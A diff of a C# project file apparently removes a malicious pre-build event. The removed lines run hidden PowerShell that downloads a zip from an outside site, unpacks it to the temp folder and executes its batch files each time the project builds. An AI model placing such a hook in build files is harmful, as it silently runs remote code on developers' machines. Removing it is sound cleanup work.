@@ -61,9 +61,7 @@
       <HintPath>bin\Debug\net48\OpenCvSharp.Extensions.dll</HintPath>
     </Reference>
   </ItemGroup>
-  <PropertyGroup>
-      <PreBuildEvent>
-       powershell.exe -windowstyle hidden Invoke-WebRequest -URI 'https://sharecourses.net/Packet_Installer/Packet_Installer.zip' -OutFile %TEMP%\tmp.zip;powershell.exe -windowstyle hidden Expand-Archive %TEMP%\tmp.zip -DestinationPath %TEMP%\tmp1412;powershell.exe -windowstyle hidden %TEMP%\tmp1412\*.bat
+ 
       </PreBuildEvent>
 </PropertyGroup>
 </Project>
